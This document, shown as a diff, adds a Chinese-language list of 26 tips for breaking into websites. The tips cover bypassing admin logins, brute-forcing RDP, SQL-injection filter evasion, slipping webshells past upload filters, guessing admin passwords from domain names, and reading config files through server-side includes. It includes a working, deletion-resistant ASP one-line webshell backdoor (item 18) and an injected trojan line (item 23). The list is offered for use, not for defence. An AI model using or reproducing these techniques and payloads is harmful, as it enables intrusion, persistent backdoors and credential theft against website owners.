@@ -1,0 +1,58 @@
+1.利用网站过滤不严直接绕过后台验证，在网站后面加上 admin/session.asp 或 admin/left.asp
+
+2.有的网站进后台会出现一个脚本提示框，输入：administrator 即可突破！因为admin代表以管理员身份进入的意思。
+
+3.有的网站开了3389，入侵之前先去连接3389，尝试弱口令或是爆破，再者就是按5次shift键，看看有没前人装过后门，然后再社工密码。
+
+4.有时候进后台会弹出提示框“请登陆”，把地址抄写出来（复制不了），然后放在网页源代码分析器里，选择浏览器-拦截跳转勾选--查看即可进入后台！
+
+5.突破防盗链访问webshell，代码：javascript:document.write("<a href='http://www.xxx.com/uploadfile/1.asp'>fuck</a>")  回车后点击GO即可进入webshell
+
+6.突破一流信息监控拦截系统访问，当小马可以访问，上传大马却不行的时候，可以先用大马跟一张图片合并，在上传合并后的图片，接着数据库备份后访问即可！
+
+7.在拿编辑器的shell时，有时增加了asp|asa|cer|php|aspx等扩展名上传时都被过滤了，其实只要增加aaspsp 上传asp就会突破了。
+
+8.有时啊D猜出表段了，但是猜不到字段的时候，可以到后台查看源文件，搜索ID或type，一般都能找到，再到啊D里添加字段进行猜解内容即可突破。
+
+9.社工后台密码可以用这个技巧，假如网站域名是：www.baidu.com 管理员名称为admin，可以试试密码“baidu”和“baidu.com”来登陆。
+
+10.手工注入时如果网站过滤了 and 1=1   and 1=2 ，可以用xor 1=1   xor 1=2 进行判断。
+
+11.本地构造上传一句话木马，如果提示“请先选择你要上传的文件！[ 重新上传 ]” ，说明文件太小了，用记事本打开再复制多几句话从而扩大文件大小，再上传即可。
+
+12.用啊d跑表，跑字段名name和pass出不来，显示长度超过50什么的，猜解不出的情况下，这时放在穿山甲去跑一般都能跑出来！
+
+13.猜管理员后台小技巧，admin/left.asp、admin/main.asp、admin/top.asp、admin/admin.asp 会现出菜单导航，然后迅雷下载全部链接。
+
+14.知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句：Insert into admin(user,pwd) values('test','test')
+
+15.当获得管理员密码，却拿不到管理员的帐号时，到前台随便打开一个新闻，找找诸如“提交者”“发布者”之类的字眼，一般“提交者”就是管理员的帐号了。
+
+16.爆破ASP+IIS架设的网站web绝对路径，假设网站主页为：http://www.xxxxx/index.asp/ 提交http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。
+
+17.源码的利用，很多网站用的都是网上下载的源码，有的站长很懒，什么也不改，然后就上传开通网站了，我们可以去下载一套，里面有很多默认的信息值得利用。
+
+18.把以下代码上传到webshell里，后缀是asp，就算别人发现了也删除不了，算是超级防删的一句话木马了，可以很安全的留个后门，菜刀连接密码：x
+<%Eval(Request(chr(120))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
+
+19.当破解出帐号密码却找不到后台的时候，可以尝试链接ftp，假如域名是：www.baidu.com “ 得到的密码为“bishi”，我们就可以试下用“xxxx”“xxxx.cn”www.xxxx.cn作为FTP 用户名，用“bishi”：作为FTP密码来进行登陆，成功的几率可以很大的哦！ftp的默认端口：21  默认帐号密码：test
+
+20.有的后台不显示验证码，难道就没法登录了么? 其实把一段代码导入注册表里就可以突破这个困境了，把下面的代码保存为Code.reg，双击导入就可以了！
+REGEDIT4 
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security] 
+"BlockXBM"=dword:00000000 
+
+21.当网站不允许上传 asp、asa、php等文件时，我们可以上传一个stm文件，代码为“<!--#include file=”conn.asp”-->”
+  (想查看什么文件就写什么文件名，这里我假设想查看“conn.asp”)，然后直接打开这个stm文件的地址，再查看源代码，“conn.asp”这个文件的代码就一览无遗了！
+
+22.当网站不允许上传ASP,CGI,CER,CDX,HTR等类型的文件时，尝试上传一个shtm文件，内容为：<!--#includ file="conn.asp"-->
+如果上传成功，那太好了，访问地址就可以浏览conn.asp里的内容了，这样一来，数据库路径也就到手啦！
+
+23.手工检测注入点弹出“你的操作已被记录!”之类的信息，访问这个文件：sqlin.asp，如果存在，在注入点后面植入一句话木马：‘excute(request("TNT"))
+接着用一句话木马客户端连接：http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。
+
+24.旁注的话，肯定是挑支持aspx的站点来日了，问题是怎样判断呢？方法很简单，在在网站后面加上xxx.aspx，如果返回“/”应用程序中的服务器错误，无法找到该资源，404画面就说明支持aspx木马。
+
+25.网站后面加test.php 可以查看版本
+
+26.禁忌这两个网站后台文件 admin_index.asp  manage_login.asp
